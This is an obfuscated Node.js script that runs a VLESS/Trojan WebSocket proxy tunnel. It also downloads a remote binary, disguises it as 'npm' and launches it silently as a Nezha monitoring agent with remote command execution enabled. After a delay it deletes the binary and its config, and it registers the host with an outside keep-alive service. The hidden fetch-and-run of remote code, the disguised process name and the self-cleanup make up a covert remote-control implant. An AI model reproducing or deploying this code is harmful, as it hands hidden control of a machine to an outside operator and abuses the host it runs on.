const _0x16a626=_0x537c;(function(_0x548cb1,_0x33ada2){const _0xbdd601=_0x537c,_0x3399c9=_0x548cb1();while(!![]){try{const _0x2ee247=-parseInt(_0xbdd601(0xa9))/0x1+parseInt(_0xbdd601(0xa2))/0x2+-parseInt(_0xbdd601(0xc5))/0x3*(parseInt(_0xbdd601(0xc9))/0x4)+-parseInt(_0xbdd601(0x109))/0x5*(parseInt(_0xbdd601(0xcc))/0x6)+-parseInt(_0xbdd601(0xe4))/0x7+parseInt(_0xbdd601(0xf1))/0x8*(-parseInt(_0xbdd601(0xbd))/0x9)+-parseInt(_0xbdd601(0xda))/0xa*(-parseInt(_0xbdd601(0x111))/0xb);if(_0x2ee247===_0x33ada2)break;else _0x3399c9['push'](_0x3399c9['shift']());}catch(_0x2ddf9c){_0x3399c9['push'](_0x3399c9['shift']());}}}(_0x3edb,0xc1af8));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x16a626(0x9e)),path=require(_0x16a626(0x106)),crypto=require('crypto'),{Buffer}=require(_0x16a626(0xb7)),{exec,execSync}=require(_0x16a626(0x10b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x16a626(0xf3)][_0x16a626(0xfe)]||_0x16a626(0xbb),NEZHA_SERVER=process['env'][_0x16a626(0xa8)]||'',NEZHA_PORT=process[_0x16a626(0xf3)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x16a626(0xf3)][_0x16a626(0xd5)]||'',DOMAIN=process[_0x16a626(0xf3)]['DOMAIN']||_0x16a626(0xf6),AUTO_ACCESS=process[_0x16a626(0xf3)][_0x16a626(0xff)]||!![],WSPATH=process[_0x16a626(0xf3)][_0x16a626(0x10c)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x16a626(0xf3)][_0x16a626(0xd1)]||'sina',NAME=process[_0x16a626(0xf3)][_0x16a626(0xa7)]||_0x16a626(0xc0),PORT=process['env'][_0x16a626(0xe8)]||0x2236;let ISP='';function _0x537c(_0x498197,_0xeee129){const _0x3edbfb=_0x3edb();return _0x537c=function(_0x537c83,_0x129c1a){_0x537c83=_0x537c83-0x9e;let _0x1e7406=_0x3edbfb[_0x537c83];return _0x1e7406;},_0x537c(_0x498197,_0xeee129);}const GetISP=async()=>{const _0x4f8d4d=_0x16a626;try{const _0x836346=await axios[_0x4f8d4d(0x119)](_0x4f8d4d(0xb5)),_0x3a90e2=_0x836346[_0x4f8d4d(0xc8)];ISP=(_0x3a90e2[_0x4f8d4d(0x11c)]+'-'+_0x3a90e2[_0x4f8d4d(0xa0)])[_0x4f8d4d(0xfa)](/ /g,'_');}catch(_0x5e7803){ISP=_0x4f8d4d(0xc4);}};GetISP();function _0x3edb(){const _0x3e3cbe=['Not\x20Found\x0a','utf8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','PORT','substr','https://arm64.ssss.nyc.mn/agent','stream','reduce','length','from','arch','concat','2344AzXsmA','readUInt8','env','finish','Answer','1234.abc.com','digest','decode','https://amd64.ssss.nyc.mn/agent','replace','map','toString','listen','UUID','AUTO_ACCESS','pipe','\x20with\x20all\x20DNS\x20servers','https://arm64.ssss.nyc.mn/v1','npm\x20running\x20error:','application/json','createServer','path','Automatic\x20Access\x20Task\x20added\x20successfully','arm64','5kXoxQV','/bin/bash','child_process','WSPATH','writeFileSync','setsid\x20nohup\x20./npm\x20-s\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2083','270897UmlKrc','createWriteStream','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm','2053','aarch64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://oooo.serv00.net/add-url','get','base64',':443?encryption=none&security=tls&sni=','country_code','net','\x20-p\x20','isp','log','2221100TYbzwB','every','index.html','writeHead','includes','NAME','NEZHA_SERVER','1545586DeEmFe','2087','type','error','unlink','createHash','client_secret:\x20','text/html','end','join','config.yaml','8443','https://api.ip.sb/geoip','chmod\x20+x\x20npm','buffer','https://dns.google/resolve?name=','Status','npm\x20is\x20already\x20running,\x20skip\x20running...','9a52c672-d43b-4211-92ab-3c7d9c5de73d','readUInt16BE','4905GtanZq','test','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sina369','Hello\x20world!','then','error:\x20','Unknown','188739AUjKjG','url','443','data','44WjIpec','sha224','pop','4133910YXGjja','1.1.1.1','Failed\x20to\x20resolve\x20','find','--tls','SUB_PATH','text/plain','&path=%2F','connect','NEZHA_KEY','post','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trim','true','1510DHCXhk','write','slice','send','arm','connection','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','false','readFile','catch','6647144cccryC'];_0x3edb=function(){return _0x3e3cbe;};return _0x3edb();}const httpServer=http[_0x16a626(0x105)]((_0x28f938,_0x420bfc)=>{const _0x2757e4=_0x16a626;if(_0x28f938[_0x2757e4(0xc6)]==='/'){const _0x4d6964=path[_0x2757e4(0xb2)](__dirname,_0x2757e4(0xa4));fs[_0x2757e4(0xe2)](_0x4d6964,_0x2757e4(0xe6),(_0x5a3b33,_0x3aba88)=>{const _0x433b2b=_0x2757e4;if(_0x5a3b33){_0x420bfc['writeHead'](0xc8,{'Content-Type':_0x433b2b(0xb0)}),_0x420bfc['end'](_0x433b2b(0xc1));return;}_0x420bfc[_0x433b2b(0xa5)](0xc8,{'Content-Type':'text/html'}),_0x420bfc[_0x433b2b(0xb1)](_0x3aba88);});return;}else{if(_0x28f938['url']==='/'+SUB_PATH){const _0x3951a2=NAME?NAME+'-'+ISP:ISP,_0x2a65bb='vless://'+UUID+'@'+DOMAIN+_0x2757e4(0x11b)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2757e4(0xd3)+WSPATH+'#'+_0x3951a2,_0x2693ec='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x2757e4(0xd3)+WSPATH+'#'+_0x3951a2,_0x17798d=_0x2a65bb+'\x0a'+_0x2693ec,_0x1c7fe6=Buffer[_0x2757e4(0xee)](_0x17798d)[_0x2757e4(0xfc)](_0x2757e4(0x11a));_0x420bfc['writeHead'](0xc8,{'Content-Type':_0x2757e4(0xd2)}),_0x420bfc[_0x2757e4(0xb1)](_0x1c7fe6+'\x0a');}else _0x420bfc['writeHead'](0x194,{'Content-Type':_0x2757e4(0xd2)}),_0x420bfc['end'](_0x2757e4(0xe5));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x16a626(0xfa)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x16a626(0xcd)];function resolveHost(_0x5945f1){return new Promise((_0x44316d,_0x2a9f8c)=>{const _0x46a184=_0x537c;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x46a184(0xbe)](_0x5945f1)){_0x44316d(_0x5945f1);return;}let _0x17ea93=0x0;function _0x36ddea(){const _0x55c2a5=_0x46a184;if(_0x17ea93>=DNS_SERVERS[_0x55c2a5(0xed)]){_0x2a9f8c(new Error(_0x55c2a5(0xce)+_0x5945f1+_0x55c2a5(0x101)));return;}const _0x3b88bc=DNS_SERVERS[_0x17ea93];_0x17ea93++;const _0x2e088a=_0x55c2a5(0xb8)+encodeURIComponent(_0x5945f1)+'&type=A';axios[_0x55c2a5(0x119)](_0x2e088a,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x55c2a5(0xc2)](_0x1d54f5=>{const _0x2f3119=_0x55c2a5,_0x4ddc6d=_0x1d54f5['data'];if(_0x4ddc6d[_0x2f3119(0xb9)]===0x0&&_0x4ddc6d[_0x2f3119(0xf5)]&&_0x4ddc6d[_0x2f3119(0xf5)]['length']>0x0){const _0x31ea48=_0x4ddc6d[_0x2f3119(0xf5)][_0x2f3119(0xcf)](_0x5a1498=>_0x5a1498[_0x2f3119(0xab)]===0x1);if(_0x31ea48){_0x44316d(_0x31ea48[_0x2f3119(0xc8)]);return;}}_0x36ddea();})[_0x55c2a5(0xe3)](_0x5c3080=>{_0x36ddea();});}_0x36ddea();});}function handleVlessConnection(_0x57d57b,_0x49fc06){const _0x4888d0=_0x16a626,[_0x1c5b78]=_0x49fc06,_0x16a6d9=_0x49fc06['slice'](0x1,0x11);if(!_0x16a6d9[_0x4888d0(0xa3)]((_0x4706d9,_0x261e06)=>_0x4706d9==parseInt(uuid['substr'](_0x261e06*0x2,0x2),0x10)))return![];let _0xd7cc63=_0x49fc06[_0x4888d0(0xdc)](0x11,0x12)[_0x4888d0(0xf2)]()+0x13;const _0x1ea808=_0x49fc06[_0x4888d0(0xdc)](_0xd7cc63,_0xd7cc63+=0x2)['readUInt16BE'](0x0),_0x53622c=_0x49fc06['slice'](_0xd7cc63,_0xd7cc63+=0x1)[_0x4888d0(0xf2)](),_0x1d0464=_0x53622c==0x1?_0x49fc06['slice'](_0xd7cc63,_0xd7cc63+=0x4)[_0x4888d0(0xb2)]('.'):_0x53622c==0x2?new TextDecoder()[_0x4888d0(0xf8)](_0x49fc06[_0x4888d0(0xdc)](_0xd7cc63+0x1,_0xd7cc63+=0x1+_0x49fc06[_0x4888d0(0xdc)](_0xd7cc63,_0xd7cc63+0x1)[_0x4888d0(0xf2)]())):_0x53622c==0x3?_0x49fc06[_0x4888d0(0xdc)](_0xd7cc63,_0xd7cc63+=0x10)[_0x4888d0(0xec)]((_0x23ffdc,_0x38e5c7,_0x1599f5,_0x5510d6)=>_0x1599f5%0x2?_0x23ffdc[_0x4888d0(0xf0)](_0x5510d6[_0x4888d0(0xdc)](_0x1599f5-0x1,_0x1599f5+0x1)):_0x23ffdc,[])[_0x4888d0(0xfb)](_0x5c5772=>_0x5c5772[_0x4888d0(0xbc)](0x0)[_0x4888d0(0xfc)](0x10))[_0x4888d0(0xb2)](':'):'';_0x57d57b[_0x4888d0(0xdd)](new Uint8Array([_0x1c5b78,0x0]));const _0x1825b5=createWebSocketStream(_0x57d57b);return resolveHost(_0x1d0464)['then'](_0x576690=>{const _0x12ffbb=_0x4888d0;net[_0x12ffbb(0xd4)]({'host':_0x576690,'port':_0x1ea808},function(){const _0x5a0aa2=_0x12ffbb;this['write'](_0x49fc06[_0x5a0aa2(0xdc)](_0xd7cc63)),_0x1825b5['on'](_0x5a0aa2(0xac),()=>{})[_0x5a0aa2(0x100)](this)['on'](_0x5a0aa2(0xac),()=>{})[_0x5a0aa2(0x100)](_0x1825b5);})['on'](_0x12ffbb(0xac),()=>{});})[_0x4888d0(0xe3)](_0x4ac28e=>{const _0x57bb68=_0x4888d0;net[_0x57bb68(0xd4)]({'host':_0x1d0464,'port':_0x1ea808},function(){const _0x4875b5=_0x57bb68;this['write'](_0x49fc06[_0x4875b5(0xdc)](_0xd7cc63)),_0x1825b5['on'](_0x4875b5(0xac),()=>{})[_0x4875b5(0x100)](this)['on'](_0x4875b5(0xac),()=>{})[_0x4875b5(0x100)](_0x1825b5);})['on'](_0x57bb68(0xac),()=>{});}),!![];}function handleTrojanConnection(_0x5c806d,_0x416125){const _0x2ee7b5=_0x16a626;try{if(_0x416125[_0x2ee7b5(0xed)]<0x3a)return![];const _0x6f5993=_0x416125[_0x2ee7b5(0xdc)](0x0,0x38)[_0x2ee7b5(0xfc)](),_0x29256b=[UUID];let _0x541478=null;for(const _0x27377a of _0x29256b){const _0x107d80=crypto[_0x2ee7b5(0xae)](_0x2ee7b5(0xca))['update'](_0x27377a)[_0x2ee7b5(0xf7)]('hex');if(_0x107d80===_0x6f5993){_0x541478=_0x27377a;break;}}if(!_0x541478)return![];let _0x37a02f=0x38;_0x416125[_0x37a02f]===0xd&&_0x416125[_0x37a02f+0x1]===0xa&&(_0x37a02f+=0x2);const _0x1ccc9d=_0x416125[_0x37a02f];if(_0x1ccc9d!==0x1)return![];_0x37a02f+=0x1;const _0x36f31e=_0x416125[_0x37a02f];_0x37a02f+=0x1;let _0x2799e2,_0x5d91e1;if(_0x36f31e===0x1)_0x2799e2=_0x416125[_0x2ee7b5(0xdc)](_0x37a02f,_0x37a02f+0x4)['join']('.'),_0x37a02f+=0x4;else{if(_0x36f31e===0x3){const _0x14226c=_0x416125[_0x37a02f];_0x37a02f+=0x1,_0x2799e2=_0x416125['slice'](_0x37a02f,_0x37a02f+_0x14226c)[_0x2ee7b5(0xfc)](),_0x37a02f+=_0x14226c;}else{if(_0x36f31e===0x4)_0x2799e2=_0x416125[_0x2ee7b5(0xdc)](_0x37a02f,_0x37a02f+0x10)['reduce']((_0x137f49,_0xb103bd,_0x462a1c,_0x1f57fb)=>_0x462a1c%0x2?_0x137f49[_0x2ee7b5(0xf0)](_0x1f57fb['slice'](_0x462a1c-0x1,_0x462a1c+0x1)):_0x137f49,[])[_0x2ee7b5(0xfb)](_0x42dce2=>_0x42dce2[_0x2ee7b5(0xbc)](0x0)[_0x2ee7b5(0xfc)](0x10))[_0x2ee7b5(0xb2)](':'),_0x37a02f+=0x10;else return![];}}_0x5d91e1=_0x416125[_0x2ee7b5(0xbc)](_0x37a02f),_0x37a02f+=0x2;_0x37a02f<_0x416125[_0x2ee7b5(0xed)]&&_0x416125[_0x37a02f]===0xd&&_0x416125[_0x37a02f+0x1]===0xa&&(_0x37a02f+=0x2);const _0x16b6ab=createWebSocketStream(_0x5c806d);return resolveHost(_0x2799e2)[_0x2ee7b5(0xc2)](_0x586de4=>{const _0x3ccf0d=_0x2ee7b5;net[_0x3ccf0d(0xd4)]({'host':_0x586de4,'port':_0x5d91e1},function(){const _0x2fb29d=_0x3ccf0d;_0x37a02f<_0x416125[_0x2fb29d(0xed)]&&this['write'](_0x416125[_0x2fb29d(0xdc)](_0x37a02f)),_0x16b6ab['on'](_0x2fb29d(0xac),()=>{})['pipe'](this)['on'](_0x2fb29d(0xac),()=>{})['pipe'](_0x16b6ab);})['on'](_0x3ccf0d(0xac),()=>{});})[_0x2ee7b5(0xe3)](_0xfd0dfc=>{const _0x5c1b92=_0x2ee7b5;net['connect']({'host':_0x2799e2,'port':_0x5d91e1},function(){const _0x433428=_0x537c;_0x37a02f<_0x416125[_0x433428(0xed)]&&this[_0x433428(0xdb)](_0x416125[_0x433428(0xdc)](_0x37a02f)),_0x16b6ab['on'](_0x433428(0xac),()=>{})['pipe'](this)['on'](_0x433428(0xac),()=>{})[_0x433428(0x100)](_0x16b6ab);})['on'](_0x5c1b92(0xac),()=>{});}),!![];}catch(_0x337e27){return![];}}wss['on'](_0x16a626(0xdf),(_0x311474,_0x26d29d)=>{const _0x4947a5=_0x16a626,_0x128b2e=_0x26d29d['url']||'';_0x311474['once']('message',_0xf31231=>{const _0x980970=_0x537c;if(_0xf31231[_0x980970(0xed)]>0x11&&_0xf31231[0x0]===0x0){const _0xd133bd=_0xf31231[_0x980970(0xdc)](0x1,0x11),_0x4f093b=_0xd133bd[_0x980970(0xa3)]((_0x2c0ce8,_0x312541)=>_0x2c0ce8==parseInt(uuid[_0x980970(0xe9)](_0x312541*0x2,0x2),0x10));if(_0x4f093b){!handleVlessConnection(_0x311474,_0xf31231)&&_0x311474['close']();return;}}!handleTrojanConnection(_0x311474,_0xf31231)&&_0x311474['close']();})['on'](_0x4947a5(0xac),()=>{});});const getDownloadUrl=()=>{const _0x24c7f0=_0x16a626,_0x4f71d4=os[_0x24c7f0(0xef)]();return _0x4f71d4===_0x24c7f0(0xde)||_0x4f71d4===_0x24c7f0(0x108)||_0x4f71d4===_0x24c7f0(0x116)?!NEZHA_PORT?_0x24c7f0(0x102):_0x24c7f0(0xea):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x24c7f0(0xf9);},downloadFile=async()=>{const _0x568fcf=_0x16a626;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2c08a4=getDownloadUrl(),_0x5cdf6d=await axios({'method':'get','url':_0x2c08a4,'responseType':_0x568fcf(0xeb)}),_0x56990f=fs[_0x568fcf(0x112)]('npm');return _0x5cdf6d[_0x568fcf(0xc8)]['pipe'](_0x56990f),new Promise((_0x11aa21,_0x4de60c)=>{const _0x7e4302=_0x568fcf;_0x56990f['on'](_0x7e4302(0xf4),()=>{const _0x45c7e2=_0x7e4302;console['log']('npm\x20download\x20successfully'),exec(_0x45c7e2(0xb6),_0x3dc6f=>{if(_0x3dc6f)_0x4de60c(_0x3dc6f);_0x11aa21();});}),_0x56990f['on']('error',_0x4de60c);});}catch(_0x54430c){throw _0x54430c;}},runnz=async()=>{const _0x26644b=_0x16a626;try{const _0x328934=execSync(_0x26644b(0x10f),{'encoding':'utf-8'});if(_0x328934[_0x26644b(0xd8)]()!==''){console[_0x26644b(0xa1)](_0x26644b(0xba));return;}}catch(_0xe9937c){}await downloadFile();let _0x2e317d='',_0x124d4b=[_0x26644b(0xc7),_0x26644b(0xb4),'2096',_0x26644b(0xaa),_0x26644b(0x110),_0x26644b(0x115)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xfac163=_0x124d4b[_0x26644b(0xa6)](NEZHA_PORT)?_0x26644b(0xd0):'';_0x2e317d=_0x26644b(0x10e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x26644b(0x9f)+NEZHA_KEY+'\x20'+_0xfac163+_0x26644b(0xe7);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ce759=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x26644b(0xcb)]():'',_0xcfd9f5=_0x124d4b[_0x26644b(0xa6)](_0x3ce759)?_0x26644b(0xd9):_0x26644b(0xe1),_0x5daf09=_0x26644b(0xaf)+NEZHA_KEY+_0x26644b(0x117)+NEZHA_SERVER+_0x26644b(0x113)+_0xcfd9f5+_0x26644b(0xe0)+UUID;fs[_0x26644b(0x10d)](_0x26644b(0xb3),_0x5daf09);}_0x2e317d=_0x26644b(0xbf);}else{console['log'](_0x26644b(0xd7));return;}}try{exec(_0x2e317d,{'shell':_0x26644b(0x10a)},_0x276443=>{const _0x1e8348=_0x26644b;if(_0x276443)console['error'](_0x1e8348(0x103),_0x276443);else console['log']('npm\x20is\x20running');});}catch(_0x526022){console[_0x26644b(0xac)](_0x26644b(0xc3)+_0x526022);}};async function addAccessTask(){const _0x7cf812=_0x16a626;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3a96ec='https://'+DOMAIN;try{const _0x4309e0=await axios[_0x7cf812(0xd6)](_0x7cf812(0x118),{'url':_0x3a96ec},{'headers':{'Content-Type':_0x7cf812(0x104)}});console[_0x7cf812(0xa1)](_0x7cf812(0x107));}catch(_0x70a498){}}const delFiles=()=>{const _0x3593a2=_0x16a626;fs[_0x3593a2(0xad)](_0x3593a2(0x114),()=>{}),fs[_0x3593a2(0xad)](_0x3593a2(0xb3),()=>{});};httpServer[_0x16a626(0xfd)](PORT,()=>{const _0x183bd6=_0x16a626;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x183bd6(0xa1)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
